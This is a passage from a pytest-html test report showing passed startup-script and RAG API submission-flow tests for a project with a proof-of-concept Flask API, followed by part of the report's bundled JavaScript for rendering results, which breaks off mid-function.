WARNING - Next.js frontend directory not found - Next.js UI will not be available\n2025-12-18 09:29:11,584 - INFO - Python package &amp;#x27;flask&amp;#x27; available\n2025-12-18 09:29:11,585 - INFO - Python package &amp;#x27;flask_cors&amp;#x27; available\n2025-12-18 09:29:11,585 - INFO - Python package &amp;#x27;werkzeug&amp;#x27; available\n2025-12-18 09:29:11,585 - INFO - Python package &amp;#x27;requests&amp;#x27; available\n\n------------------------------ Captured log call -------------------------------\nERROR    scripts.startup.start_servers:start_servers.py:102 Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpfw9ikfgc/src/api/poc-api/app.py\nERROR    scripts.startup.start_servers:start_servers.py:102 Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpfw9ikfgc/src/frontend/web-legacy/app.py\nWARNING  scripts.startup.start_servers:start_servers.py:104 Next.js frontend directory not found - Next.js UI will not be available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;flask&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;flask_cors&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;werkzeug&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;requests&amp;#x27; available\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestServerManager::test_validate_dependencies_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestServerManager::test_validate_dependencies_success&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestServerManager::test_validate_dependencies_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u274c Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpvqqa3h19/src/api/poc-api/app.py\n\u274c Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpvqqa3h19/src/frontend/web-legacy/app.py\n\u26a0\ufe0f Next.js frontend directory not found - Next.js UI will not be available\n\u2705 Python package &amp;#x27;flask&amp;#x27; available\n\u2705 Python package &amp;#x27;flask_cors&amp;#x27; available\n\u2705 Python package &amp;#x27;werkzeug&amp;#x27; available\n\u2705 Python package &amp;#x27;requests&amp;#x27; available\n\n======================================================================\nTEST RESULT: test_validate_dependencies_success - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,586 - ERROR - Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpvqqa3h19/src/api/poc-api/app.py\n2025-12-18 09:29:11,587 - ERROR - Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpvqqa3h19/src/frontend/web-legacy/app.py\n2025-12-18 09:29:11,587 - WARNING - Next.js frontend directory not found - Next.js UI will not be available\n2025-12-18 09:29:11,587 - INFO - Python package &amp;#x27;flask&amp;#x27; available\n2025-12-18 09:29:11,587 - INFO - Python package &amp;#x27;flask_cors&amp;#x27; available\n2025-12-18 09:29:11,587 - INFO - Python package &amp;#x27;werkzeug&amp;#x27; available\n2025-12-18 09:29:11,587 - INFO - Python package &amp;#x27;requests&amp;#x27; available\n\n------------------------------ Captured log call -------------------------------\nERROR    scripts.startup.start_servers:start_servers.py:102 Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpvqqa3h19/src/api/poc-api/app.py\nERROR    scripts.startup.start_servers:start_servers.py:102 Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpvqqa3h19/src/frontend/web-legacy/app.py\nWARNING  scripts.startup.start_servers:start_servers.py:104 Next.js frontend directory not found - Next.js UI will not be available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;flask&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;flask_cors&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;werkzeug&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;requests&amp;#x27; available\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestServerManager::test_validate_service_readiness_failure&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestServerManager::test_validate_service_readiness_failure&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestServerManager::test_validate_service_readiness_failure&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Validating service health (timeout: 1s)...\n\u2139\ufe0f Checking PoC API (API health endpoint)...\n\u274c \u274c PoC API health check error: Connection failed...\n\u2139\ufe0f Checking PoC API (API status endpoint)...\n\u274c \u274c PoC API health check error: Connection failed...\n\u26a0\ufe0f \u26a0\ufe0f PoC API failed all health checks\n\n======================================================================\nTEST RESULT: test_validate_service_readiness_failure - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,588 - INFO - Validating service health (timeout: 1s)...\n2025-12-18 09:29:11,588 - INFO - Checking PoC API (API health endpoint)...\n2025-12-18 09:29:11,588 - ERROR - \u274c PoC API health check error: Connection failed...\n2025-12-18 09:29:11,588 - INFO - Checking PoC API (API status endpoint)...\n2025-12-18 09:29:11,588 - ERROR - \u274c PoC API health check error: Connection failed...\n2025-12-18 09:29:11,588 - WARNING - \u26a0\ufe0f PoC API failed all health checks\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Validating service health (timeout: 1s)...\nINFO     scripts.startup.start_servers:start_servers.py:106 Checking PoC API (API health endpoint)...\nERROR    scripts.startup.start_servers:start_servers.py:102 \u274c PoC API health check error: Connection failed...\nINFO     scripts.startup.start_servers:start_servers.py:106 Checking PoC API (API status endpoint)...\nERROR    scripts.startup.start_servers:start_servers.py:102 \u274c PoC API health check error: Connection failed...\nWARNING  scripts.startup.start_servers:start_servers.py:104 \u26a0\ufe0f PoC API failed all health checks\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestServerManager::test_validate_service_readiness_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestServerManager::test_validate_service_readiness_success&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestServerManager::test_validate_service_readiness_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Validating service health (timeout: 20s)...\n\u2139\ufe0f Checking PoC API (API health endpoint)...\n\u2705 \u2705 PoC API is responding (status: 200)\n\n======================================================================\nTEST RESULT: test_validate_service_readiness_success - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,589 - INFO - Validating service health (timeout: 20s)...\n2025-12-18 09:29:11,589 - INFO - Checking PoC API (API health endpoint)...\n2025-12-18 09:29:11,589 - INFO - \u2705 PoC API is responding (status: 200)\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Validating service health (timeout: 20s)...\nINFO     scripts.startup.start_servers:start_servers.py:106 Checking PoC API (API health endpoint)...\nINFO     scripts.startup.start_servers:start_servers.py:100 \u2705 PoC API is responding (status: 200)\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupIntegration::test_server_manager_initialization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupIntegration::test_server_manager_initialization&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupIntegration::test_server_manager_initialization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_server_manager_initialization - PASSED\nDuration: 0.00s\nCategory: integration\n======================================================================\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_dependency_validation_subprocess_error&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_dependency_validation_subprocess_error&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupErrorHandling::test_dependency_validation_subprocess_error&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2705 PoC API file found: app.py\n\u2705 Legacy Web UI file found: app.py\n\u2705 Next.js frontend directory found\n\u2705 Next.js dependencies installed\n\u2705 Next.js package.json found\n\u2705 Python package &amp;#x27;flask&amp;#x27; available\n\u2705 Python package &amp;#x27;flask_cors&amp;#x27; available\n\u2705 Python package &amp;#x27;werkzeug&amp;#x27; available\n\u2705 Python package &amp;#x27;requests&amp;#x27; available\n\u26a0\ufe0f Node.js/npm not available - Next.js frontend will not start\n\n======================================================================\nTEST RESULT: test_dependency_validation_subprocess_error - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,592 - INFO - PoC API file found: app.py\n2025-12-18 09:29:11,592 - INFO - Legacy Web UI file found: app.py\n2025-12-18 09:29:11,592 - INFO - Next.js frontend directory found\n2025-12-18 09:29:11,592 - INFO - Next.js dependencies installed\n2025-12-18 09:29:11,592 - INFO - Next.js package.json found\n2025-12-18 09:29:11,592 - INFO - Python package &amp;#x27;flask&amp;#x27; available\n2025-12-18 09:29:11,592 - INFO - Python package &amp;#x27;flask_cors&amp;#x27; available\n2025-12-18 09:29:11,592 - INFO - Python package &amp;#x27;werkzeug&amp;#x27; available\n2025-12-18 09:29:11,592 - INFO - Python package &amp;#x27;requests&amp;#x27; available\n2025-12-18 09:29:11,592 - WARNING - Node.js/npm not available - Next.js frontend will not start\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:100 PoC API file found: app.py\nINFO     scripts.startup.start_servers:start_servers.py:100 Legacy Web UI file found: app.py\nINFO     scripts.startup.start_servers:start_servers.py:100 Next.js frontend directory found\nINFO     scripts.startup.start_servers:start_servers.py:100 Next.js dependencies installed\nINFO     scripts.startup.start_servers:start_servers.py:100 Next.js package.json found\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;flask&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;flask_cors&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;werkzeug&amp;#x27; available\nINFO     scripts.startup.start_servers:start_servers.py:100 Python package &amp;#x27;requests&amp;#x27; available\nWARNING  scripts.startup.start_servers:start_servers.py:104 Node.js/npm not available - Next.js frontend will not start\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_load_environment_io_error&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_load_environment_io_error&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupErrorHandling::test_load_environment_io_error&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Loading environment configuration from .env file...\n\u274c Failed to read .env file: Permission denied\n\n======================================================================\nTEST RESULT: test_load_environment_io_error - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,593 - INFO - Loading environment configuration from .env file...\n2025-12-18 09:29:11,593 - ERROR - Failed to read .env file: Permission denied\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Loading environment configuration from .env file...\nERROR    scripts.startup.start_servers:start_servers.py:102 Failed to read .env file: Permission denied\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_load_environment_unicode_error&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_load_environment_unicode_error&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupErrorHandling::test_load_environment_unicode_error&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Loading environment configuration from .env file...\n\u274c Invalid encoding in .env file: &amp;#x27;utf-8&amp;#x27; codec can&amp;#x27;t decode bytes in position 0-0: invalid\n\n======================================================================\nTEST RESULT: test_load_environment_unicode_error - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,594 - INFO - Loading environment configuration from .env file...\n2025-12-18 09:29:11,594 - ERROR - Invalid encoding in .env file: &amp;#x27;utf-8&amp;#x27; codec can&amp;#x27;t decode bytes in position 0-0: invalid\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Loading environment configuration from .env file...\nERROR    scripts.startup.start_servers:start_servers.py:102 Invalid encoding in .env file: &amp;#x27;utf-8&amp;#x27; codec can&amp;#x27;t decode bytes in position 0-0: invalid\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_process_failure&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_process_failure&#34;, &#34;duration&#34;: &#34;00:00:03&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_process_failure&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:03&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Starting Test Server on port 8080...\n\u274c Test Server failed to start\n\n======================================================================\nTEST RESULT: test_start_server_process_failure - PASSED\nDuration: 3.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,595 - INFO - Starting Test Server on port 8080...\n2025-12-18 09:29:14,597 - ERROR - Test Server failed to start\n2025-12-18 09:29:14,597 - ERROR - Service startup error: Error starting server...\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Starting Test Server on port 8080...\nERROR    scripts.startup.start_servers:start_servers.py:102 Test Server failed to start\nERROR    scripts.startup.start_servers:start_servers.py:366 Service startup error: Error starting server...\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_custom_env&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_custom_env&#34;, &#34;duration&#34;: &#34;00:00:03&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_custom_env&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:03&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Starting Test Server on port 8080...\n\u2705 Test Server started successfully\n\u26a0\ufe0f Test Server started but connectivity test failed\n\n======================================================================\nTEST RESULT: test_start_server_with_custom_env - PASSED\nDuration: 3.01s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:14,598 - INFO - Starting Test Server on port 8080...\n2025-12-18 09:29:17,603 - INFO - Test Server started successfully\n2025-12-18 09:29:17,604 - WARNING - Test Server started but connectivity test failed\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Starting Test Server on port 8080...\nINFO     scripts.startup.start_servers:start_servers.py:100 Test Server started successfully\nWARNING  scripts.startup.start_servers:start_servers.py:104 Test Server started but connectivity test failed\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_cwd&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_cwd&#34;, &#34;duration&#34;: &#34;00:00:03&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_cwd&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:03&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Starting Test Server on port 8080...\n\u2705 Test Server started successfully\n\u26a0\ufe0f Test Server started but connectivity test failed\n\n======================================================================\nTEST RESULT: test_start_server_with_cwd - PASSED\nDuration: 3.01s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:17,605 - INFO - Starting Test Server on port 8080...\n2025-12-18 09:29:20,611 - INFO - Test Server started successfully\n2025-12-18 09:29:20,611 - WARNING - Test Server started but connectivity test failed\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Starting Test Server on port 8080...\nINFO     scripts.startup.start_servers:start_servers.py:100 Test Server started successfully\nWARNING  scripts.startup.start_servers:start_servers.py:104 Test Server started but connectivity test failed\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_list_command&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_list_command&#34;, &#34;duration&#34;: &#34;00:00:03&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_list_command&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:03&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Starting Test Server on port 8080...\n\u2705 Test Server started successfully\n\u26a0\ufe0f Test Server started but connectivity test failed\n\n======================================================================\nTEST RESULT: test_start_server_with_list_command - PASSED\nDuration: 3.01s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:20,613 - INFO - Starting Test Server on port 8080...\n2025-12-18 09:29:23,618 - INFO - Test Server started successfully\n2025-12-18 09:29:23,619 - WARNING - Test Server started but connectivity test failed\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Starting Test Server on port 8080...\nINFO     scripts.startup.start_servers:start_servers.py:100 Test Server started successfully\nWARNING  scripts.startup.start_servers:start_servers.py:104 Test Server started but connectivity test failed\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_string_command&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_string_command&#34;, &#34;duration&#34;: &#34;00:00:03&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestStartupErrorHandling::test_start_server_with_string_command&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:03&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Starting Test Server on port 8080...\n\u2705 Test Server started successfully\n\u26a0\ufe0f Test Server started but connectivity test failed\n\n======================================================================\nTEST RESULT: test_start_server_with_string_command - PASSED\nDuration: 3.01s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:23,620 - INFO - Starting Test Server on port 8080...\n2025-12-18 09:29:26,625 - INFO - Test Server started successfully\n2025-12-18 09:29:26,626 - WARNING - Test Server started but connectivity test failed\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Starting Test Server on port 8080...\nINFO     scripts.startup.start_servers:start_servers.py:100 Test Server started successfully\nWARNING  scripts.startup.start_servers:start_servers.py:104 Test Server started but connectivity test failed\n\n&#34;}], &#34;tests/test_submission_flow.py::test_submission_flow&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_submission_flow.py::test_submission_flow&#34;, &#34;duration&#34;: &#34;803 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_submission_flow.py::test_submission_flow&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;803 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n======================================================================\nTesting Complete Submission Flow to RAG API\n======================================================================\n\n[Step 1] Health Check\n----------------------------------------------------------------------\n   Status: 200\n   Time: 0.00s\n   \u2705 Health check passed\n   LLM: groq\n\n[Step 2] Preparing Evaluation Query\n----------------------------------------------------------------------\n   Query length: 1462 chars\n   System prompt length: 4460 chars\n\n[Step 3] Sending Evaluation Query to RAG API\n----------------------------------------------------------------------\n   This simulates the actual submission flow...\n   Using Ollama LLM (may take 30-120 seconds)\n   Sending request...\n   Waiting for response (showing progress every 10s)...\n\n   \u2705 Response received!\n   Status Code: 200\n   Total Time: 0.80 seconds (0.0 minutes)\n\n   Response Details:\n   - Answer length: 1335 characters\n   - Sources: 5\n\n   Answer Preview:\n   **Evaluation Report (Full)**\n\n### **Artifact Summary**\n\nTitle: Test Scientific Paper on Fractal Quantum Structures\n\n### **Evaluation Table**\n\n| Metric | Value |\n| --- | --- |\n| \u03a6 (Coherence) | 8000 |\n...\n\n   \u2705 Found valid JSON in response!\n   Keys: [&amp;#x27;artifact_id&amp;#x27;, &amp;#x27;contributor_name&amp;#x27;, &amp;#x27;tier_issued&amp;#x27;, &amp;#x27;token_awarded&amp;#x27;, &amp;#x27;verification_hash&amp;#x27;, &amp;#x27;date&amp;#x27;, &amp;#x27;syntheverse_seal&amp;#x27;]\n--------------------------- Captured stdout teardown ---------------------------\n\ud83d\uded1 Stopping services...\nService cleanup complete\n&#34;}]}, &#34;renderCollapsed&#34;: [&#34;passed&#34;], &#34;initialSort&#34;: &#34;result&#34;, &#34;title&#34;: &#34;test_report_single.html&#34;}"></div>
    <script>
      (function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
const { getCollapsedCategory, setCollapsedIds } = require('./storage.js')

class DataManager {
    setManager(data) {
        const collapsedCategories = [...getCollapsedCategory(data.renderCollapsed)]
        const collapsedIds = []
        const tests = Object.values(data.tests).flat().map((test, index) => {
            const collapsed = collapsedCategories.includes(test.result.toLowerCase())
            const id = `test_${index}`
            if (collapsed) {
                collapsedIds.push(id)
            }
            return {
                ...test,
                id,
                collapsed,
            }
        })
        const dataBlob = { ...data, tests }
        this.data = { ...dataBlob }
        this.renderData = { ...dataBlob }
        setCollapsedIds(collapsedIds)
    }

    get allData() {
        return { ...this.data }
    }

    resetRender() {
        this.renderData = { ...this.data }
    }

    setRender(data) {
        this.renderData.tests = [...data]
    }

    toggleCollapsedItem(id) {
        this.renderData.tests = this.renderData.tests.map((test) =>
            test.id === id ? { ...test, collapsed: !test.collapsed } : test,
        )
    }

    set allCollapsed(collapsed) {
        this.renderData = { ...this.renderData, tests: [...this.renderData.tests.map((test) => (
            { ...test, collapsed }
        ))] }
    }

    get testSubset() {
        return [...this.renderData.tests]
    }

    get environment() {
        return this.renderData.environment
    }

    get initialSort() {
        return this.data.initialSort
    }
}

module.exports = {
    manager: new DataManager(),
}

},{"./storage.js":8}],2:[function(require,module,exports){
const mediaViewer = require('./mediaviewer.js')
const templateEnvRow = document.getElementById('template_environment_row')
const templateResult = document.getElementById('template_results-table__tbody')

function htmlToElements(html) {
    const temp = document.createElement('template')
    temp.innerHTML = html
    return temp.content.childNodes
}

const find = (selector, elem) => {
    if (!elem) {
        elem = document
    }
    return elem.querySelector(selector)
}

const findAll = (selector, elem) => {
    if (!elem) {
        elem = document
    }
    return [...elem.querySelectorAll(selector)]
}

const dom = {
    getStaticRow: (key, value) => {
        const envRow = templateEnvRow.content.cloneNode(true)
        const isObj = typeof value === 'object' && value !== null
        const values = isObj ? Object.keys(value).map((k) => `${k}: ${value[k]}`) : null

        const valuesElement = htmlToElements(
            values ? `<ul>${values.map((val) => `<li>${val}</li>`).join('')}<ul>` : `<div>${value}</div>`)[0]
        const td = findAll('td', envRow)
        td[0].textContent = key
        td[1].appendChild(valuesElement)

        return envRow
    },
    getResultTBody: ({ testId, id, log, extras, resultsTableRow, tableHtml, result, collapsed }) => {
        const resultBody = templateResult.content.cloneNode(true)
        resultBody.querySelector('tbody').classList.add(result.toLowerCase())
        resultBody.querySelector('tbody').id = testId
        resultBody.querySelector('.collapsible').dataset.id = id

        resultsTableRow.forEach((html) => {
